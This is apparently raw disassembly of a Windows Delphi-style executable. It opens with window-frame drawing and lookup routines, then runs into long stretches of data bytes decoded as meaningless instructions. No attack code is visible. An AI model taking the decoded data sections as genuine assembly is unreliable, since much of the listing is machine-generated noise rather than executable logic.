call sub_404914
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_440238
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_440444
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_4404c8
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_440504
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_440521 ]
jmp [ eax * 4 + jump_table_44058a ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_440890
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_4409eb
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_4404c8
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_440334
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_417358
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_440a18
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_440a53
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440a5a
retn
mov eax [ rw-data ]
call sub_4032b0
mov eax rw-data
call sub_4040ac
sub_440a64
mov al 0xa
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx + 0x44 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
mov ebp 0x1ae00044
inc edx
add ah ch
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add ah cl
cmp eax [ ebp ]
dec eax
xor al [ eax ]
xor al [ fs : eax ]
js r-xdata
inc esp
add [ esi + 0x1000440b ] dl
add al [ eax ]
add [ eax - 0x43 ] dl
inc esp
add al ah
sbb al [ edx ]
in al dx
add [ eax + 0x4400455e ] cl
pop edi
inc ebp
add [ ebx + ebp * 2 + 0x45 ] ch
add [ ebx + esi - 0x7053ffbb ] dl
inc ecx
add [ eax ] ch
sbb [ ebp ] eax
and al 0xed
inc esp
add [ eax + 0x20 ] cl
inc ebp
add [ esi + esi * 8 ] bh
inc esp
add al bh
sbb al [ edx ]
loopne r-xdata
jne r-xdata
add [ edx + esi * 2 + 0x45 ] bl
push 0x45
add [ eax - 0x3ffbb15 ] bl
pushad
inc ebp
add [ ecx ] bl
inc ebp
add [ esi + ebx * 2 ] dh
inc ebp
add al ah
0xeae40044 0x44
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
and al 0x4f
inc esp
add [ eax - 0x63ffba9a ] al
imul eax [ ebp ] 0xffffffe8
xor eax [ ebp ]
lodsb [ esi ]
pop [ ecx ]
sub [ ecx ] bl
je r-xdata
inc eax
je r-xdata
push 0x45
add [ eax - 0x3ffbb15 ] bl
pushad
inc ebp
add [ ecx ] bl
inc ebp
add [ esi + ebx * 2 ] dh
inc ebp
add al ah
0xeae40044 0x44
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
and al 0x4f
inc esp
add [ eax - 0x63ffba9a ] al
imul eax [ ebp ] 0xffffffe8
inc ebp
add [ esi + esi * 8 ] bh
inc esp
add al bh
sbb al [ edx ]
add [ ebx + esi - 0x7053ffbb ] dl
insd
inc edi
jb r-xdata
add [ eax + 0x4400455e ] cl
pop edi
inc ebp
inc ebp
add [ ebx + ebp * 2 + 0x45 ] ch
hlt
insd
inc edi
jb r-xdata
inc ebp
add [ ebp * 8 + 0x20480044 ] ah
add [ edi + ecx * 4 + 0x19280041 ] ch
jne r-xdata
pop ebx
add [ eax ] al
[ eax - 0x13 ]
add [ edx + esi * 2 + 0x45 ] bl
add ah ah
pop esp
inc ebp
add ah dl
pop edi
inc ebp
add ah ch
dec edi
inc esp
add [ ecx ] cl
push esp
inc edi
jb r-xdata
int3
jne r-xdata
inc ecx
add [ eax ] ch
sbb [ ebp ] eax
and al 0xed
inc esp
add [ eax + 0x20 ] cl
inc edx
outsd
js r-xdata
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
jne r-xdata
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x7d ] bh
inc edx
outsd
js r-xdata
add ah ah
pop esp
inc ebp
add ah dl
pop edi
inc ebp
add ah ch
dec edi
inc esp
add [ eax + eax ] al
push es
mov al 0x12
mov al 0x10
mov al 0x5
add [ eax + 0x28004453 ] ch
push esp
inc esp
add [ esp + edx * 2 ] bh
inc esp
add [ eax + 0x54 ] bl
inc esp
add [ edi ] cl
push esp
inc ebx
jne r-xdata
inc ebp
or al [ eax + eax - 0x80 ]
mov esi 0xb0044
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add dh bh
js r-xdata
add [ eax ] al
inc edx
outsd
js r-xdata
inc ebp
add [ eax + 0x5a ] al
inc ebp
add [ eax ] ch
pop edi
inc ebp
add [ eax + 0x5400444f ] al
daa
inc ebp
add ah dh
xor al 0x45
add ah bl
dec edi
inc esp
add ah bl
xor [ ebp ] eax
or al 0x30
inc ebp
add [ ebp + esi + 0x35900045 ] cl
inc ebp
add [ eax + 0x34 ] cl
inc ebp
add al dh
xor eax [ ebp ]
push 0xc8004560
jge r-xdata
shr [ ebx + ecx + 0xf070044 ] 0x54
inc ebx
loopne r-xdata
insb
jae r-xdata
push [ eax ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5a ] al
inc ebp
add [ eax ] ch
pop edi
inc ebp
add [ eax + 0x5400444f ] al
daa
inc ebp
add ah dh
xor al 0x45
add ah bl
dec edi
inc esp
add ah bl
xor [ ebp ] eax
or al 0x30
inc ebp
add [ ebp + esi + 0x35900045 ] cl
inc ebp
add [ eax + 0x34 ] cl
inc ebp
add al dh
xor eax [ ebp ]
push 0xc8004560
jge r-xdata
inc esp
add [ eax + 0x280044f7 ] dh
test [ eax + eax + 0x3c ] 0xe80044fa
clc
inc esp
add [ eax + 0x3a ] ch
inc ebp
add [ eax - 0x77ffbae5 ] ch
pop esi
inc ebp
add [ edi + ebx * 2 + 0x45 ] al
sar ah 0xc
inc esp
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] edx
outsd
jne r-xdata
add ah cl
cmp eax [ ebp ]
dec eax
xor al [ eax ]
xor al [ fs : eax ]
js r-xdata
add [ ebx + 0x440c20c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
or al 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
or al 0x44
add [ eax ] dl
add al [ eax ]
add [ edx + ecx + 0x44 ] ah
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
xor [ gs : ecx + 0x7a0044 ] ah
add bh bh
jpe r-xdata
imul ebp [ edi + 0x6e ] r-xdata
jo r-xdata
add [ eax + 0x4208000d ] al
inc edx
outsd
js r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc eax [ eax ]
add bh bh
hlt
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x44
add [ eax + 0x3500440b ] ch
add [ eax ] cl
push ebx
je r-xdata
dec [ eax - 0x7 ]
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
or eax [ ebx + 0x6f ]
outsb
jae r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1865646f
test al 0x44
add [ eax + edi * 8 + 0x44 ] dl
add [ eax + edi * 8 + 0x18680044 ] al
inc edx
inc ebx
je r-xdata
adc [ eax ] al
push esp
jb r-xdata
inc esp
add [ eax - 0x7 ] bl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040017 ] al
outsd
outsb
je r-xdata
add bh bh
dec eax
stc
jb r-xdata
add bh bh
fwait
jb r-xdata
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000e ] al
popad
jo r-xdata
clc
insb
jae r-xdata
inc edx
add [ eax + eax + 0x1fe00 ] bh
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb [ eax ] al
adc [ eax + 0x61 ] dl
jb r-xdata
add [ eax ] al
add [ edx ] dl
add [ eax ] cl
inc esp
outsd
arpl [ ebx + 0x53 ] bp
imul esi [ ebp + 0x30 ] 0x7a0044a1
add [ eax ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
cmpsd [ esi ] [ edi ]
inc esp
add [ ebx - 0x64010000 ] bl
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x6b00ffff ] ah
popad
inc ebp
add [ eax + 0x4561 ] bh
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
je r-xdata
jmp r-xdata
or eax [ eax ]
add eax 0x67696c41
outsb
mov [ eax + 0x610044 ] ch
add bh bh
test al 0xeb
inc esp
add [ esp + ebp * 8 + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax - 0x5f ] cl
inc esp
add [ ebx ] bl
add bh bh
push 0x10044ed
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61500e00
outsb
je r-xdata
inc ebp
add [ ecx ] al
outsb
je r-xdata
inc esp
cmpsd [ esi ] [ edi ]
inc esp
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x72440800
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
dec [ eax + 0x4518 ]
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ss
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
push esp
inc edx
add [ eax ] ch
xor eax [ eax + eax + 0x10 ]
inc eax
add [ eax + 0x30ff0001 ] ch
dec esp
inc ebp
inc esp
add [ eax + 0x18 ] ch
outsb
je r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ ecx ] cl
push eax
outsb
sbb al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
add [ eax + 0x1 ] al
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
popad
inc ebp
add [ eax + 0x62 ] dh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
pop ds
add [ eax ] cl
push ebx
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
adc [ eax ] al
test eax 0xc4ff0001
popad
je r-xdata
jo r-xdata
jb r-xdata
push cs
push eax
popad
je r-xdata
jb r-xdata
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or edx [ eax + 0x61 ]
0x7c0045 0xff00
test al 0x44
add al dh
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
adc [ eax ] al
push edi
add [ eax ] al
push [ edi + esi * 8 + 0x44 ]
add al ch
sbb [ ebp ] al
add [ eax ] al
add [ eax + 0x1 ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x38656c62
pop ebx
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
inc esp
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ eax + 0x1004562 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
outsd
jb r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
cmp cl 0x44
add [ ecx ] al
add [ eax ] al
je r-xdata
outsb
add [ fs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
push eax
popad
jb r-xdata
adc [ eax ] al
0xc8ff0000 0x44f9
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
jmp [ ecx + edi * 8 - 0x693ffbc ]
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
or dl [ eax + 0x61 ]
outsb
je r-xdata
add [ eax ] al
add [ ebx ] bl
add [ ebx ] cl
push eax
popad
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop edx
add [ eax ] al
[ eax ]
cli
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub_443608
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_4436e4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al 0x38
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
aaa
inc esp
add [ esi ] dl
cmp [ eax + eax + 0xc ] al
add al [ eax ]
add [ eax + edi * 4 + 0x44 ] dl
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add ah cl
cmp eax [ ebp ]
dec eax
xor al [ eax ]
xor al [ fs : eax ]
movsb [ edi ] [ esi ]
push ds
inc ebp
add [ ebx + ebp * 2 + 0x45 ] ch
add [ ebx + esi - 0x7053ffbb ] dl
inc ecx
add [ eax ] ch
sbb [ ebp ] eax
and al 0xed
inc esp
add [ eax + 0x20 ] cl
inc ebp
add [ esi + esi * 8 ] bh
inc esp
add al bh
sbb al [ edx ]
loopne r-xdata
push 0x45
add [ eax - 0x3ffbb15 ] bl
pushad
inc ebp
add [ ecx ] bl
inc ebp
add [ esi + ebx * 2 ] dh
inc ebp
add al ah
0xeae40044 0x44
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
and al 0x84
inc esp
add [ eax - 0x63ffba9a ] al
imul eax [ ebp ] 0xffffffe8
sub_443858
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x39
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi + 0x44 ] dh
add [ esi + 0x18004439 ] ah
add al [ eax ]
add al ah
inc esp
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add ah cl
cmp eax [ ebp ]
dec eax
xor al [ eax ]
xor al [ fs : eax ]
movsb [ edi ] [ esi ]
push ds
inc ebp
add [ ebx + ebp * 2 + 0x45 ] ch
add [ ebx + esi - 0x7053ffbb ] dl
inc ecx
add [ eax ] ch
sbb [ ebp ] eax
and al 0xed
inc esp
add [ eax + 0x20 ] cl
inc ebp
add [ esi + esi * 8 ] bh
inc esp
add al bh
sbb al [ edx ]
loopne r-xdata
push 0x45
add [ eax - 0x3ffbb15 ] bl
pushad
inc ebp
add [ ecx ] bl
inc ebp
add [ esi + ebx * 2 ] dh
inc ebp
add al ah
0xeae40044 0x44
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
sbb [ esi + 0x66800044 ] al
inc ebp
add [ ebx + ebp * 2 + 0x6ae80045 ] bl
inc ebp
sub_4438f4
clc
sbb al [ ebp ]
and al 0x1b
inc ebp
add [ esi + esi * 8 ] ah
inc esp
add [ esp + ebp * 8 + 0x44 ] bl
add [ eax + 0x280044f7 ] dh
test [ eax + eax + 0x3c ] 0xe80044fa
clc
inc esp
add al dh
test [ eax + eax - 0x58 ] al
sbb eax [ ebp ]
mov [ esi + 0x45 ] bl
add [ edi + ebx * 2 + 0x45 ] al
add [ eax + 0x5a ] al
inc ebp
add [ eax ] ch
pop edi
inc ebp
add al al
and [ ebp ] al
push esp
daa
inc ebp
add ah dh
xor al 0x45
add [ edi + eax * 4 ] ch
inc esp
add ah bl
xor [ ebp ] eax
push 0x8c004487
xor eax 0x35900045
inc ebp
add [ eax + 0x34 ] cl
inc ebp
add al dh
xor eax [ ebp ]
push 0x38004560
inc ebp
add [ edx + esi * 2 + 0x45 ] bl
add ah ah
pop esp
inc ebp
add ah dl
pop edi
inc ebp
add al cl
test [ eax + eax - 0x14 ] al
test [ eax + eax - 0x5c ] al
xchg [ eax + eax + 0x8 ] al
add [ 0x7b006b0 ] al
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
dec eax
call [ edi + eax * 4 - 0x77fbffbc ]
inc esp
add [ eax - 0x7fffbb78 ] cl
xchg [ eax + eax + 0x8 ] eax
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax + 0x7c ] al
xchg [ eax + eax - 0x60 ] al
xchg [ eax + eax + 0x7 ] al
push esp
inc edx
jne r-xdata
add dh bh
js r-xdata
je r-xdata
push [ eax ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
mov eax eax
mov ah 0x39
inc esp
add [ edi ] al
pop es
push esp
inc edx
jne r-xdata
fwait
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
imul ebp [ edi + 0x6e ] r-xdata
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
adc [ edx ] eax
add bh bh
add [ eax ] cl
inc edx
je r-xdata
add bh bh
inc eax
sbb eax 0x10045
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
or eax [ ebx + 0x6f ]
add [ eax + 0x4208000d ] al
outsb
mov al [ 0x28004438 ]
cmp [ eax + eax + 0x31 ] al
add [ eax ] cl
push ebx
je r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
jb r-xdata
push cs
add [ esi ] al
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
sbb [ eax - 0x7abffbc ] ch
inc esp
add [ eax + edi * 8 + 0x18680044 ] al
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4307000f ] al
popad
jo r-xdata
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x10006564
inc eax
add [ ecx ] dl
add al [ eax ]
call [ ecx ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebx
je r-xdata
add [ eax ] al
adc eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax ] dl
add al [ eax ]
adc [ edx ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jae r-xdata
popad
add [ eax ] al
[ eax + 0x440044eb ]
add ah ah
jb r-xdata
pop ecx
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
add [ eax + eax ] bh
add dh bh
enter 0x44eb 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov [ eax + 0x610044 ] ch
add bh bh
test al 0xeb
inc esp
add [ esp + ebp * 8 + 0x44 ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0010 ] al
outsd
sub_443f28
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
inc eax
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x40 ] al
inc esp
add [ edx + 0x40 ] bl
inc esp
add [ edx + eax ] dl
add [ eax ] al
loopne r-xdata
dec eax
and [ ebp ] al
cmp al 0xf6
inc esp
add al bh
sbb al [ edx ]
loopne r-xdata
inc esp
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add ah cl
cmp eax [ ebp ]
dec eax
xor al [ eax ]
xor al [ fs : eax ]
movsb [ edi ] [ esi ]
push ds
inc ebp
add [ ebx + ebp * 2 + 0x45 ] ch
add [ ebx + esi - 0x7053ffbb ] dl
inc ecx
add [ eax ] ch
sbb [ ebp ] eax
and al 0xed
inc esp
add [ eax + 0x20 ] cl
inc ebp
add [ esi + esi * 8 ] bh
push 0x45
add [ eax - 0x3ffbb15 ] bl
pushad
inc ebp
add [ ecx ] bl
inc ebp
add [ esi + ebx * 2 ] dh
inc ebp
add al ah
0xeae40044 0x44
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
push esp
mov [ eax + eax - 0x80 ] eax
inc bp
add [ ebx + ebp * 2 + 0x6ae80045 ] bl
inc ebp
sub_443fc4
clc
sbb al [ ebp ]
and al 0x1b
inc ebp
add [ esi + esi * 8 ] ah
inc esp
add [ esp + ebp * 8 + 0x44 ] bl
add [ eax + 0x280044f7 ] dh
test [ eax + eax + 0x3c ] 0xe80044fa
clc
inc esp
add al dh
test [ eax + eax - 0x58 ] al
sbb eax [ ebp ]
mov [ esi + 0x45 ] bl
add [ edi + ebx * 2 + 0x45 ] al
add [ eax + 0x5a ] al
inc ebp
add [ eax ] ch
pop edi
inc ebp
add al al
and [ ebp ] al
push esp
daa
inc ebp
add ah dh
xor al 0x45
